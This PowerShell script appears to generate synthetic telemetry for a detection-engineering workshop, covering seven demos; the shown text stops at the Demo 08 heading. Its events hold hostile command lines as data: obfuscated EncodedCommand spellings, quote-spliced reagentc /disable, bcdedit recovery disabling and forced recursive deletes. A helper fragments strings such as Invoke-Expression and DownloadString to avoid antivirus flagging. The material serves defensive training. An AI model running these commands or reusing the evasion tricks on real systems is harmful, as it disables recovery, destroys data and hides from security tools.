<#
.SYNOPSIS
    DEATHCon 2026 Lab - Adversarial Detection Engineering telemetry generator.

.DESCRIPTION
    Interactive generator of SYNTHETIC telemetry for the workshop's 8 demos. For each
    lab you select, it builds up to 100 varied, unique log events and ships them to a
    SIEM (Splunk HTTP Event Collector) or writes them to an ndjson file. Participants
    then run the detection rules they wrote (the solutions/ exercises) against this
    telemetry and measure how well they hold up.

    Each lab's batch is a deliberate MIX:
      * evasive true-positives  - should fire the HARDENED rule, slip the NAIVE one
      * FP-trap near-misses      - look close but should fire NEITHER rule
      * benign baseline noise    - ordinary host activity

    Output is newline-delimited JSON (ndjson): one event per line, Sysmon/PowerShell
    field names. Ingest it into whatever SIEM you run - point a file monitor / uploader
    at the file, or one-shot import it. The generator is SIEM-agnostic; it only cares
    about producing correct, varied logs.

    This script GENERATES LOG RECORDS ONLY. It never executes reagentc, certutil,
    powershell -enc, wsl, Remove-Item, or any other command shown in the data. The
    attack-looking strings exist only as fields inside the emitted events.

.PARAMETER OutFile
    ndjson output path. Default: .\deathcon-telemetry.ndjson

.PARAMETER Labs
    Non-interactive lab selection, e.g. -Labs 1,3,8  or  -Labs all

.PARAMETER PerLab
    Hard cap on events generated per selected lab. Default and max: 100.

.PARAMETER IncludeGroundTruth
    Add a 'deathcon' answer-key object to each event (demo, technique, expectation).
    Off by default so the telemetry stays clean; turn on for self-grading.

.PARAMETER Seed
    RNG seed for reproducible batches.

.PARAMETER ScriptBlockLogging
    Whether PowerShell Script Block Logging (Event 4104) is enabled on the hosts, which
    governs Demo 08's telemetry. 'On' = every obfuscated script produces a 4104 event
    (your script-content rule can see it). 'Off' = NO 4104 is emitted; the only trace is
    the process_creation (EID 1) of powershell.exe, with the payload either visible on the
    command line or hidden inside -EncodedCommand - the "obfuscation wins without SBL"
    lesson. 'Mixed' (default) = SBL state is decided per host, so some obfuscated execs
    log 4104 and some don't. Only affects Demo 08.

.EXAMPLE
    .\Invoke-LabTelemetry.ps1
    Interactive: pick labs, write ndjson.

.EXAMPLE
    .\Invoke-LabTelemetry.ps1 -Labs 8 -ScriptBlockLogging Off
    Demo 08 with SBL disabled - your 4104 rule sees nothing; only EID 1 remains.

.EXAMPLE
    .\Invoke-LabTelemetry.ps1 -Labs all -OutFile C:\lab\all.ndjson -IncludeGroundTruth

.EXAMPLE
    .\Invoke-LabTelemetry.ps1 -Labs 1,5,8 -PerLab 100
#>
[CmdletBinding()]
param(
    [string]$OutFile = ".\deathcon-telemetry.ndjson",
    [string[]]$Labs,
    [ValidateRange(1,100)] [int]$PerLab = 100,
    [switch]$IncludeGroundTruth,
    [int]$Seed,
    [ValidateSet('On','Off','Mixed')] [string]$ScriptBlockLogging = 'Mixed'
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

# ------------------------------------------------------------------------------------
# Assemble helper: build indicator strings from fragments so this .ps1 does not carry
# notorious literals contiguously (avoids on-access AV / AMSI flagging the generator).
# The full strings only ever exist at runtime, as data placed into event fields.
# ------------------------------------------------------------------------------------
function A { param([Parameter(ValueFromRemainingArguments=$true)][string[]]$p) -join $p }

$T = @{
    IEX        = (A 'Invoke' '-Expr' 'ession')
    DlString   = (A 'Download' 'String')
    DlData     = (A 'Download' 'Data')
    WebClient  = (A 'Net.' 'Web' 'Client')
    FromB64    = (A '[Convert]::' 'FromBase64' 'String')
    Gzip       = (A '[System.IO.Compression.' 'GzipStream' ']')
    Enc        = (A 'Encoded' 'Command')     # base word; abbreviations derived below
    Reagentc   = (A 'reag' 'entc')
    Disable    = (A '/dis' 'able')
    Certutil   = (A 'cert' 'util')
    Urlcache   = (A 'url' 'cache')
    Split      = (A 'sp' 'lit')
    IWR        = (A 'Invoke-' 'WebRequest')
    SBCreate   = (A '[scriptblock]::' 'Create')
    RemoveItem = (A 'Remove' '-Item')
}

# ------------------------------------------------------------------------------------
# Randomness + environment variety
# ------------------------------------------------------------------------------------
if ($PSBoundParameters.ContainsKey('Seed')) { $script:Rng = [Random]::new($Seed) }
else { $script:Rng = [Random]::new() }

function Rand([int]$max) { $script:Rng.Next($max) }                       # 0..max-1
function RandR([int]$min,[int]$max) { $script:Rng.Next($min,$max) }        # min..max-1
function Pick { param([object[]]$items) $items[$script:Rng.Next($items.Count)] }
function Chance([double]$p) { $script:Rng.NextDouble() -lt $p }

$Hosts = @('WKSTN-01','WKSTN-07','FIN-DESK-3','HR-LAPTOP-2','DEV-BOX-11','SOC-JUMP-1')
$Users = @('CORP\alice','CORP\bob','CORP\carol','CORP\dave','CORP\svc-backup','CORP\jdoe')
$script:Clock = [DateTime]::UtcNow.AddMinutes(-90)

function NextTime { param([int]$maxJitterSec = 45)
    $script:Clock = $script:Clock.AddSeconds((Rand $maxJitterSec) + 1)
    $script:Clock.ToString("yyyy-MM-dd HH:mm:ss.fff")
}
function Guid2 { '{' + [Guid]::NewGuid().ToString() + '}' }

# ------------------------------------------------------------------------------------
# String-mangling primitives (the ADE building blocks the demos teach)
# ------------------------------------------------------------------------------------
function RandCase { param([string]$s)
    -join ($s.ToCharArray() | ForEach-Object {
        if (Chance 0.5) { ([string]$_).ToUpper() } else { ([string]$_).ToLower() }
    })
}
function SpaceRun { (' ' * (RandR 1 4)) }                 # 1..3 spaces
function QuoteSplice { param([string]$s)                  # who"a"mi style empty/paired splices
    $q = Pick @('"','""','`')
    $chars = $s.ToCharArray(); $out = ''
    foreach ($c in $chars) { $out += $c; if (Chance 0.30) { $out += $q } }
    $out
}
# PowerShell parameter-prefix characters that WORK (verified on Windows):
$DashPrefixes = @('-','/', [char]0x2013, [char]0x2014, [char]0x2015)   # -, /, en, em, horiz bar
# Prefixes that LOOK right but are REJECTED (used for FP traps):
$BadPrefixes  = @([char]0x2010,[char]0x2011,[char]0x2012,[char]0x2212)
$EncAbbrev    = @('e','en','enc','enco','encod','encode','encoded','encodedc','encodedco',
                  'encodedcom','encodedcomm','encodedcomma','encodedcomman','encodedcommand','ec')

function B64Utf16 { param([string]$s)                     # what -EncodedCommand really takes
    [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s))
}
$BenignInner = @('Write-Output hello','Get-Date','Get-Process | Out-Null',
                 'Get-ChildItem C:\ | Measure-Object','$PSVersionTable | Out-Null')

# ------------------------------------------------------------------------------------
# Event builders (Sysmon schema + PowerShell 4104). Each carries a hidden _gt answer key.
# ------------------------------------------------------------------------------------
function BaseCtx {
    $u = Pick $Users
    [ordered]@{ Computer = (Pick $Hosts); User = $u }
}
function New-ProcEvent {
    param([string]$Image,[string]$OriginalFileName,[string]$CommandLine,
          [string]$ParentImage,[string]$ParentCommandLine,
          [string]$ParentGuid,[string]$User,[string]$Computer,[string]$Utc,[hashtable]$Gt)
    $ctx = BaseCtx
    $e = [ordered]@{
        EventID           = 1
        Channel           = 'Microsoft-Windows-Sysmon/Operational'
        UtcTime           = ($(if ($Utc) { $Utc } else { NextTime }))
        Computer          = ($(if ($Computer) { $Computer } else { $ctx.Computer }))
        ProcessGuid       = (Guid2)
        ProcessId         = (RandR 1000 40000)
        Image             = $Image
        OriginalFileName  = $OriginalFileName
        CommandLine       = $CommandLine
        CurrentDirectory  = 'C:\Windows\System32\'
        User              = ($(if ($User) { $User } else { $ctx.User }))
        IntegrityLevel    = (Pick @('Medium','High'))
        ParentProcessGuid = ($(if ($ParentGuid) { $ParentGuid } else { Guid2 }))
        ParentProcessId   = (RandR 1000 40000)
        ParentImage       = $ParentImage
        ParentCommandLine = $ParentCommandLine
    }
    if ($Gt) { $e['_gt'] = $Gt }
    [pscustomobject]$e
}
function New-FileEvent {
    param([string]$TargetFilename,[string]$Image,[string]$ProcessGuid,
          [string]$User,[string]$Computer,[hashtable]$Gt)
    $ctx = BaseCtx
    $e = [ordered]@{
        EventID         = 11
        Channel         = 'Microsoft-Windows-Sysmon/Operational'
        UtcTime         = (NextTime)
        Computer        = ($(if ($Computer) { $Computer } else { $ctx.Computer }))
        ProcessGuid     = ($(if ($ProcessGuid) { $ProcessGuid } else { Guid2 }))
        Image           = $Image
        TargetFilename  = $TargetFilename
        CreationUtcTime = $script:Clock.ToString("yyyy-MM-dd HH:mm:ss.fff")
        User            = ($(if ($User) { $User } else { $ctx.User }))
    }
    if ($Gt) { $e['_gt'] = $Gt }
    [pscustomobject]$e
}
function New-RegEvent {
    param([string]$TargetObject,[string]$Details,[string]$Image,[hashtable]$Gt)
    $ctx = BaseCtx
    $e = [ordered]@{
        EventID      = 13
        Channel      = 'Microsoft-Windows-Sysmon/Operational'
        EventType    = 'SetValue'
        UtcTime      = (NextTime)
        Computer     = $ctx.Computer
        ProcessGuid  = (Guid2)
        Image        = $Image
        TargetObject = $TargetObject
        Details      = $Details
        User         = $ctx.User
    }
    if ($Gt) { $e['_gt'] = $Gt }
    [pscustomobject]$e
}
function New-DeleteEvent {
    param([int]$EventID,[string]$TargetFilename,[string]$Image,[string]$ProcessGuid,
          [string]$User,[string]$Computer,[string]$Utc,[hashtable]$Gt)
    $e = [ordered]@{
        EventID        = $EventID          # 23 = FileDelete (archives), 26 = FileDeleteDetected
        Channel        = 'Microsoft-Windows-Sysmon/Operational'
        UtcTime        = ($(if ($Utc) { $Utc } else { NextTime }))
        Computer       = ($(if ($Computer) { $Computer } else { Pick $Hosts }))
        ProcessGuid    = $ProcessGuid
        Image          = $Image
        TargetFilename = $TargetFilename
        User           = $User
    }
    if ($EventID -eq 23) { $e['IsExecutable'] = 'false'; $e['Archived'] = 'true' }
    if ($Gt) { $e['_gt'] = $Gt }
    [pscustomobject]$e
}
function New-PSScript {
    param([string]$ScriptBlockText,[string]$User,[string]$Computer,[hashtable]$Gt)
    $ctx = BaseCtx
    $e = [ordered]@{
        EventID         = 4104
        Channel         = 'Microsoft-Windows-PowerShell/Operational'
        UtcTime         = (NextTime)
        Computer        = ($(if ($Computer) { $Computer } else { $ctx.Computer }))
        ScriptBlockText = $ScriptBlockText
        ScriptBlockId   = ([Guid]::NewGuid().ToString())
        MessageNumber   = 1
        MessageTotal    = 1
        Path            = (Pick @('','C:\Users\Public\a.ps1','C:\temp\run.ps1'))
        User            = ($(if ($User) { $User } else { $ctx.User }))
    }
    if ($Gt) { $e['_gt'] = $Gt }
    [pscustomobject]$e
}
function GT { param([int]$demo,[string]$tech,[string]$exp,[bool]$evadesNaive=$true)
    @{ demo=$demo; technique=$tech; expectation=$exp; evades_naive=$evadesNaive }
}
# expectation values:
#   'hardened_fires'   - a real bypass; the participant's hardened rule SHOULD catch it
#   'fp_trap'          - close but benign; a good rule fires on NEITHER
#   'baseline'         - ordinary noise
#   'bypass_static'    - a bypass no STATIC rule catches (only behavioral/AMSI)
#   'blind_no_sbl'     - obfuscated exec on a host with Script Block Logging DISABLED:
#                        no 4104 is produced, so a 4104-based rule sees nothing; only the
#                        EID 1 powershell launch (and behavioral layers) can observe it

# SBL state is decided once per host (GPO is per-host/OU in reality), then reused.
$script:SblHosts = @{}
function Sbl-ForHost { param([string]$Computer,[string]$Mode)
    switch ($Mode) {
        'On'  { $true }
        'Off' { $false }
        default {
            if (-not $script:SblHosts.ContainsKey($Computer)) { $script:SblHosts[$Computer] = (Chance 0.5) }
            $script:SblHosts[$Computer]
        }
    }
}

# ====================================================================================
# LAB GENERATORS  (each returns an array of events, trimmed to $PerLab by caller)
# ====================================================================================

# ---- Demo 01: Parameter Variation (EncodedCommand flag equivalence class) -----------
function Get-Lab01 {
    $ev = @()
    $imgs = @(@{i='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; o='PowerShell.EXE'},
              @{i='C:\Program Files\PowerShell\7\pwsh.exe';                    o='pwsh.dll'})
    $parents = @('C:\Windows\System32\cmd.exe','C:\Windows\explorer.exe',
                 'C:\Windows\System32\wscript.exe','C:\Program Files\Microsoft VS Code\Code.exe')
    # ~55 evasive true-positives across the whole 75-spelling class
    for ($n=0; $n -lt 55; $n++) {
        $p   = Pick $imgs
        $pre = Pick $DashPrefixes
        $ab  = RandCase (Pick $EncAbbrev)
        $ws  = SpaceRun
        $b64 = B64Utf16 (Pick $BenignInner)
        $flag = "$pre$ab"
        $extra = if (Chance 0.4) { (Pick @('-nop ','-noprofile ','-w hidden ','-ExecutionPolicy Bypass ','')) } else { '' }
        $cl = "`"$($p.i)`" $extra$flag$ws$b64"
        $par = Pick $parents
        $ev += New-ProcEvent -Image $p.i -OriginalFileName $p.o -CommandLine $cl `
                 -ParentImage $par -ParentCommandLine "`"$par`"" `
                 -Gt (GT 1 "prefix='$pre' abbrev='$ab'" 'hardened_fires' $true)
    }
    # ~20 FP traps: other flags / bad unicode prefixes / -e inside a path
    $fp = @()
    1..6 | ForEach-Object {
        $p = Pick $imgs
        $fp += ,@("`"$($p.i)`" -ExecutionPolicy Bypass -File C:\it\deploy.ps1", $p, "ExecutionPolicy not EncodedCommand")
    }
    1..5 | ForEach-Object {
        $p = Pick $imgs
        $fp += ,@("`"$($p.i)`" -EncodedArguments $(B64Utf16 'args') -File C:\it\job.ps1", $p, "EncodedArguments is not an exec flag")
    }
    1..5 | ForEach-Object {
        $p = Pick $imgs
        $fp += ,@("`"$($p.i)`" -File `"C:\logs\app-e.log.ps1`"", $p, "-e mid-token, not anchored")
    }
    1..4 | ForEach-Object {
        $p = Pick $imgs; $bad = Pick $BadPrefixes
        $fp += ,@("`"$($p.i)`" ${bad}enc $(B64Utf16 'x')", $p, "rejected unicode dash prefix U+$([int]$bad)")
    }
    foreach ($f in $fp) {
        $par = Pick $parents
        $ev += New-ProcEvent -Image $f[1].i -OriginalFileName $f[1].o -CommandLine $f[0] `
                 -ParentImage $par -ParentCommandLine "`"$par`"" `
                 -Gt (GT 1 $f[2] 'fp_trap' $false)
    }
    # baseline noise: benign powershell usage
    1..(($PerLab)-$ev.Count) | ForEach-Object {
        if ($ev.Count -ge $PerLab) { return }
        $p = Pick $imgs
        $cl = "`"$($p.i)`" " + (Pick @('-File C:\scripts\backup.ps1','-Command Get-Date',
                 '-NoProfile -File C:\it\inventory.ps1','-Command "Get-Service | Out-Null"'))
        $par = Pick $parents
        $ev += New-ProcEvent -Image $p.i -OriginalFileName $p.o -CommandLine $cl `
                 -ParentImage $par -ParentCommandLine "`"$par`"" `
                 -Gt (GT 1 'benign powershell' 'baseline' $false)
    }
    $ev
}

# ---- Demo 02: Fragmentation & Chaining (FileCreate -> LOLBin executes the file) -----
function Get-Lab02 {
    $ev = @()
    $lolbins = @(
        @{img='C:\Windows\System32\ftp.exe';        ofn='ftp.exe';  ext='.txt'; flag={param($f) "-s:$f"}},
        @{img='C:\Windows\System32\cmd.exe';        ofn='Cmd.Exe';  ext='.bat'; flag={param($f) "/c $f"}},
        @{img='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; ofn='PowerShell.EXE'; ext='.ps1'; flag={param($f) "-File $f"}},
        @{img='C:\Windows\System32\cscript.exe';    ofn='cscript.exe'; ext='.vbs'; flag={param($f) "$f //B"}}
    )
    # ~28 correlated bundles: EID11 write then EID1 exec of that path, same parent+user, <30s
    $bundles = 28
    for ($b=0; $b -lt $bundles -and $ev.Count -lt ($PerLab-1); $b++) {
        $lb  = Pick $lolbins
        $usr = Pick $Users; $cmp = Pick $Hosts
        $parGuid = Guid2
        $parImg = 'C:\Windows\explorer.exe'
        $dir = Pick @('C:\Users\Public\','C:\Windows\Temp\','C:\ProgramData\')
        $name = -join ((1..6) | ForEach-Object { [char](RandR 97 123) })
        $path = "$dir$name$($lb.ext)"
        $writer = Pick @('C:\Windows\System32\cmd.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe')
        $t0 = [DateTime]::UtcNow.AddMinutes(-(RandR 5 80))
        # EID 11 - file written (same user + host as the execution)
        $fe = New-FileEvent -TargetFilename $path -Image $writer -ProcessGuid $parGuid `
                 -User $usr -Computer $cmp `
                 -Gt (GT 2 'script file written' 'hardened_fires' $true)
        $fe.UtcTime = $t0.ToString("yyyy-MM-dd HH:mm:ss.fff")
        $ev += $fe
        # EID 1 - LOLBin executes the just-written file within 30s, same parent/user/host
        $flag = & $lb.flag $path
        $cl = "`"$($lb.img)`" $flag"
        $execUtc = $t0.AddSeconds((RandR 2 25)).ToString("yyyy-MM-dd HH:mm:ss.fff")
        $ev += New-ProcEvent -Image $lb.img -OriginalFileName $lb.ofn -CommandLine $cl `
                 -ParentImage $parImg -ParentCommandLine '' -ParentGuid $parGuid `
                 -User $usr -Computer $cmp -Utc $execUtc `
                 -Gt (GT 2 "$($lb.ofn) runs freshly-written $($lb.ext)" 'hardened_fires' $true)
    }
    # FP traps: LOLBin runs a file NOT freshly written (no matching EID11), and a compiler
    while ($ev.Count -lt ($PerLab-4)) {
        if (Chance 0.5) {
            $lb = Pick $lolbins
            $cl = "`"$($lb.img)`" " + (& $lb.flag "C:\Program Files\App\config$($lb.ext)")
            $ev += New-ProcEvent -Image $lb.img -OriginalFileName $lb.ofn -CommandLine $cl `
                     -ParentImage 'C:\Windows\System32\services.exe' -ParentCommandLine '' `
                     -Gt (GT 2 'LOLBin runs pre-existing config (no fresh write)' 'fp_trap' $false)
        } else {
            # benign compiler write+run (classic FP for this correlation)
            $g = Guid2
            $obj = "C:\src\build\out$(Rand 999).tmp"
            $ev += New-FileEvent -TargetFilename $obj -Image 'C:\Program Files\LLVM\bin\clang.exe' -ProcessGuid $g `
                     -Gt (GT 2 'compiler temp write' 'baseline' $false)
            $ev += New-ProcEvent -Image 'C:\Program Files\LLVM\bin\lld.exe' -OriginalFileName 'lld.exe' `
                     -CommandLine "lld.exe $obj" -ParentImage 'C:\Program Files\LLVM\bin\clang.exe' `
                     -ParentCommandLine '' -ParentGuid $g `
                     -Gt (GT 2 'compiler links temp (benign build)' 'baseline' $false)
        }
    }
    $ev | Select-Object -First $PerLab
}

# ---- Demo 03: Whitespace Manipulation ----------------------------------------------
function Get-Lab03 {
    $ev = @()
    $recon = @(
        @{img='C:\Windows\System32\ipconfig.exe'; ofn='ipconfig.exe'; base='ipconfig'; flag='/all'},
        @{img='C:\Windows\System32\whoami.exe';   ofn='whoami.exe';   base='whoami';   flag=''},
        @{img='C:\Windows\System32\net.exe';      ofn='net.exe';      base='net';      flag='config'}
    )
    # ~55 evasive: 2+ spaces (or zero space) around the flag; various parents
    for ($n=0; $n -lt 55 -and $ev.Count -lt 60; $n++) {
        $r = Pick $recon
        $sep = Pick @('  ','   ','','    ',"`t")     # multi-space, none, tab - all break one-space literal
        $cl = if ($r.flag) { "$($r.base)$sep$($r.flag)" } else { $r.base }
        $par = Pick @('C:\Windows\System32\cmd.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe')
        $ev += New-ProcEvent -Image $r.img -OriginalFileName $r.ofn -CommandLine $cl `
                 -ParentImage $par -ParentCommandLine "`"$par`" /c ..." `
                 -Gt (GT 3 "whitespace='$([regex]::Escape($sep))'" 'hardened_fires' $true)
    }
    # FP traps: /allcompartments (word-boundary), benign single-space canonical (naive would catch - not a bypass)
    1..6 | ForEach-Object {
        if ($ev.Count -ge $PerLab) { return }
        $ev += New-ProcEvent -Image 'C:\Windows\System32\ipconfig.exe' -OriginalFileName 'ipconfig.exe' `
                 -CommandLine 'ipconfig  /allcompartments' -ParentImage 'C:\Windows\System32\cmd.exe' `
                 -ParentCommandLine '' -Gt (GT 3 '/allcompartments word boundary' 'fp_trap' $false)
    }
    # baseline benign
    while ($ev.Count -lt $PerLab) {
        $ev += New-ProcEvent -Image 'C:\Windows\System32\ipconfig.exe' -OriginalFileName 'ipconfig.exe' `
                 -CommandLine (Pick @('ipconfig /release','ipconfig /renew','ipconfig')) `
                 -ParentImage 'C:\Windows\explorer.exe' -ParentCommandLine '' `
                 -Gt (GT 3 'benign ipconfig' 'baseline' $false)
    }
    $ev | Select-Object -First $PerLab
}

# ---- Demo 04: Boolean Replacement (4104) + behavioral mass-delete (EID 26) ----------
function Get-Lab04 {
    $ev = @()
    $cmdlets = @($T.RemoveItem,'del','erase','rd','rm','ri','rmdir')
    $boolForms = @('-Force','-Force:$true','-Force:1','-Force:([bool]1)','-Force:(1 -eq 1)','-Force:([bool]::Parse(''true''))')
    # ~35 evasive 4104 events: cmdlet-family + -Force(any form) + -Recurse
    for ($n=0; $n -lt 35 -and $ev.Count -lt 40; $n++) {
        $c = Pick $cmdlets; $bf = Pick $boolForms
        $order = if (Chance 0.5) { "$c -Path 'C:\sensitive' -Recurse $bf" }
                 else { "$c -Path 'C:\sensitive' $bf -Recurse" }
        $ev += New-PSScript -ScriptBlockText $order -Gt (GT 4 "$c $bf +Recurse" 'hardened_fires' $true)
    }
    # FP traps: -Force WITHOUT -Recurse; -Recurse on Get-ChildItem only; benign cleanup
    1..5 | ForEach-Object { if ($ev.Count -lt $PerLab) {
        $ev += New-PSScript -ScriptBlockText "$($T.RemoveItem) -Path C:\temp\one.log -Force" `
                 -Gt (GT 4 '-Force without -Recurse' 'fp_trap' $false) } }
    1..4 | ForEach-Object { if ($ev.Count -lt $PerLab) {
        $ev += New-PSScript -ScriptBlockText "Get-ChildItem -Path C:\logs -Recurse | Measure-Object" `
                 -Gt (GT 4 '-Recurse on Get-ChildItem, no delete' 'fp_trap' $false) } }
    # behavioral: ONE mass-delete process, ~45 EID26 in a 60s window (clear vs benign <5)
    $burst = [Math]::Min(45, [Math]::Max(10, $PerLab - $ev.Count - 6))
    $g = Guid2; $usr = Pick $Users; $cmp = Pick $Hosts
    $t0 = [DateTime]::UtcNow.AddMinutes(-10)
    for ($k=0; $k -lt $burst -and $ev.Count -lt ($PerLab-3); $k++) {
        $utc = $t0.AddSeconds($k).ToString("yyyy-MM-dd HH:mm:ss.fff")
        $ev += New-DeleteEvent -EventID 26 -TargetFilename "C:\Users\$($usr.Split('\')[-1])\Documents\file$k.docx" `
                 -Image 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -ProcessGuid $g `
                 -User $usr -Computer $cmp -Utc $utc `
                 -Gt (GT 4 'mass FileDeleteDetected same ProcessGuid/60s' 'hardened_fires' $true)
    }
    # a few benign single deletes (different guids)
    while ($ev.Count -lt $PerLab) {
        $ev += New-DeleteEvent -EventID 26 -TargetFilename "C:\Windows\Temp\t$(Rand 9999).tmp" `
                 -Image 'C:\Windows\System32\svchost.exe' -ProcessGuid (Guid2) -User (Pick $Users) `
                 -Gt (GT 4 'benign single delete' 'baseline' $false)
    }
    $ev | Select-Object -First $PerLab
}

# ---- Demo 05: Quote Manipulation (reagentc /disable) + side-effect telemetry --------
function Get-Lab05 {
    $ev = @()
    $reagentc = 'C:\Windows\System32\ReAgentc.exe'
    # ~45 evasive: quote-spliced /disable on reagentc, plus bcdedit recoveryenabled No
    for ($n=0; $n -lt 40 -and $ev.Count -lt 45; $n++) {
        if (Chance 0.75) {
            $spliced = QuoteSplice $T.Disable
            $ws = Pick @(' ','  ','   ')
            $cl = "reagentc.exe$ws$spliced"
            $ev += New-ProcEvent -Image $reagentc -OriginalFileName 'reagentc.exe' -CommandLine $cl `
                     -ParentImage 'C:\Windows\System32\cmd.exe' -ParentCommandLine '' `
                     -Gt (GT 5 "quote-spliced disable '$spliced'" 'hardened_fires' $true)
        } else {
            $val = Pick @('No','no','0','false')
            $cl = "bcdedit  /set {default} recoveryenabled $val"
            $ev += New-ProcEvent -Image 'C:\Windows\System32\bcdedit.exe' -OriginalFileName 'bcdedit.exe' `
                     -CommandLine $cl -ParentImage 'C:\Windows\System32\cmd.exe' -ParentCommandLine '' `
                     -Gt (GT 5 "bcdedit recoveryenabled $val" 'hardened_fires' $true)
        }
    }
    # side-effect telemetry (Layer 2 behavioral): ReAgent.xml write, BCD registry set
    1..5 | ForEach-Object { if ($ev.Count -lt $PerLab) {
        $ev += New-FileEvent -TargetFilename 'C:\Windows\System32\Recovery\ReAgent.xml' `
                 -Image $reagentc -Gt (GT 5 'ReAgent.xml rewrite (side effect)' 'hardened_fires' $true) } }
    1..4 | ForEach-Object { if ($ev.Count -lt $PerLab) {
        $ev += New-RegEvent -TargetObject 'HKLM\BCD00000000\Objects\{default}\Elements\16000009\Element' `
                 -Details 'Binary Data' -Image $reagentc `
                 -Gt (GT 5 'BCD recoveryenabled element cleared' 'hardened_fires' $true) } }
    # FP traps: legit reagentc flags
    foreach ($lf in @('/enable','/info','/boottore')) {
        if ($ev.Count -lt $PerLab) {
            $ev += New-ProcEvent -Image $reagentc -OriginalFileName 'reagentc.exe' `
                     -CommandLine "reagentc.exe $lf" -ParentImage 'C:\Windows\System32\cmd.exe' -ParentCommandLine '' `
                     -Gt (GT 5 "legit reagentc $lf" 'fp_trap' $false)
        }
    }
    # baseline noise
    while ($ev.Count -lt $PerLab) {
        $ev += New-ProcEvent -Image 'C:\Windows\System32\bcdedit.exe' -OriginalFileName 'bcdedit.exe' `
                 -CommandLine 'bcdedit /enum' -ParentImage 'C:\Windows\System32\cmd.exe' -ParentCommandLine '' `
                 -Gt (GT 5 'benign bcdedit /enum' 'baseline' $false)
    }
    $ev | Select-Object -First $PerLab
}

# ---- Demo 06: Delimiter Manipulation (recon chain, same parent, 60s) ----------------
function Get-Lab06 {
    $ev = @()
    $recon = @(
        @{img='C:\Windows\System32\whoami.exe';    ofn='whoami.exe'},
        @{img='C:\Windows\System32\hostname.exe';  ofn='hostname.exe'},
        @{img='C:\Windows\System32\nltest.exe';    ofn='nltestrk.exe'},
        @{img='C:\Windows\System32\net.exe';       ofn='net.exe'},
        @{img='C:\Windows\System32\ipconfig.exe';  ofn='ipconfig.exe'},
        @{img='C:\Windows\System32\systeminfo.exe';ofn='sysinfo.exe'},
        @{img='C:\Windows\System32\tasklist.exe';  ofn='tasklist.exe'}
    )
    # ~14 chains of 3-5 recon binaries sharing one parent within 60s (delimiter irrelevant)
    $chains = 14
    for ($c=0; $c -lt $chains -and $ev.Count -lt ($PerLab-3); $c++) {
        $parGuid = Guid2
        $parImg = Pick @('C:\Windows\System32\cmd.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe')
        $usr = Pick $Users; $cmp = Pick $Hosts
        $delim = Pick @(';','&','&&','|')
        $count = RandR 3 6
        $picks = $recon | Sort-Object { $script:Rng.Next() } | Select-Object -First $count
        $t0 = [DateTime]::UtcNow.AddMinutes(-(RandR 5 80))
        $i = 0
        foreach ($r in $picks) {
            if ($ev.Count -ge $PerLab) { break }
            $utc = $t0.AddSeconds($i * (RandR 2 10)).ToString("yyyy-MM-dd HH:mm:ss.fff")
            $ev += New-ProcEvent -Image $r.img -OriginalFileName $r.ofn -CommandLine ($r.ofn.Replace('.exe','')) `
                   -ParentImage $parImg -ParentCommandLine "chain delimiter '$delim'" -ParentGuid $parGuid `
                   -User $usr -Computer $cmp -Utc $utc `
                   -Gt (GT 6 "recon chain member (delim '$delim')" 'hardened_fires' $true)
            $i++
        }
    }
    # FP traps: a single lone recon binary (benign), and one recon from each of DIFFERENT parents
    while ($ev.Count -lt $PerLab) {
        $r = Pick $recon
        $ev += New-ProcEvent -Image $r.img -OriginalFileName $r.ofn -CommandLine ($r.ofn.Replace('.exe','')) `
                 -ParentImage 'C:\Windows\explorer.exe' -ParentCommandLine '' -ParentGuid (Guid2) `
                 -Gt (GT 6 'lone recon binary, unique parent' 'fp_trap' $false)
    }
    $ev | Select-Object -First $PerLab
}

# ---- Demo 07: WSL for PowerShell (wsl.exe + Windows-side file drop, temporal) --------
function Get-Lab07 {
    $ev = @()
    $wsl = 'C:\Windows\System32\wsl.exe'
    $dropExt = @('.exe','.dll','.ps1','.js','.vbs','.hta','.bat')
    # ~20 temporal bundles: wsl.exe invocation + a user-writable file drop within 5m, same host
    $bundles = 20
    for ($b=0; $b -lt $bundles -and $ev.Count -lt ($PerLab-3); $b++) {
        $cmp = Pick $Hosts; $usr = Pick $Users
        $parImg = Pick @('C:\Windows\System32\WindowsTerminal.exe','C:\Program Files\Microsoft VS Code\Code.exe',
                         'C:\Windows\explorer.exe')
        $t0 = [DateTime]::UtcNow.AddMinutes(-(RandR 5 70))
        $wslCmd = Pick @('wsl.exe -d Ubuntu -e pwsh -c "..."','wsl.exe bash -c "..."','wsl.exe -e /bin/bash')
        $e1 = New-ProcEvent -Image $wsl -OriginalFileName 'wsl.exe' -CommandLine $wslCmd `
                -ParentImage $parImg -ParentCommandLine '' `
                -Gt (GT 7 'wsl.exe invocation' 'hardened_fires' $true)
        $e1.Computer = $cmp; $e1.UtcTime = $t0.ToString("yyyy-MM-dd HH:mm:ss.fff")
        $ev += $e1
        # DllHost writes the payload into C:\Users\Public\ (owner is the WSL VM host, not wsl.exe)
        $name = -join ((1..7) | ForEach-Object { [char](RandR 97 123) })
        $path = "C:\Users\Public\$name$(Pick $dropExt)"
        $e2 = New-FileEvent -TargetFilename $path -Image 'C:\Windows\System32\dllhost.exe' `
                -Computer $cmp -User $usr -Gt (GT 7 'user-writable file drop from WSL' 'hardened_fires' $true)
        $e2.UtcTime = $t0.AddSeconds((RandR 5 250)).ToString("yyyy-MM-dd HH:mm:ss.fff")
        $ev += $e2
    }
    # FP traps: benign wsl dev use with NO drop; and a Public drop from a normal installer (no wsl)
    while ($ev.Count -lt $PerLab) {
        if (Chance 0.5) {
            $ev += New-ProcEvent -Image $wsl -OriginalFileName 'wsl.exe' -CommandLine 'wsl.exe --list --verbose' `
                     -ParentImage 'C:\Windows\System32\WindowsTerminal.exe' -ParentCommandLine '' `
                     -Gt (GT 7 'benign wsl --list (no drop)' 'fp_trap' $false)
        } else {
            $ev += New-FileEvent -TargetFilename 'C:\Users\Public\Desktop\vendor-tool.lnk' `
                     -Image 'C:\Windows\System32\msiexec.exe' `
                     -Gt (GT 7 'installer Public drop (no wsl)' 'fp_trap' $false)
        }
    }
    $ev | Select-Object -First $PerLab
}

# ---- Demo 08: Obfuscation (4104 construction primitives + obfuscated certutil) -------
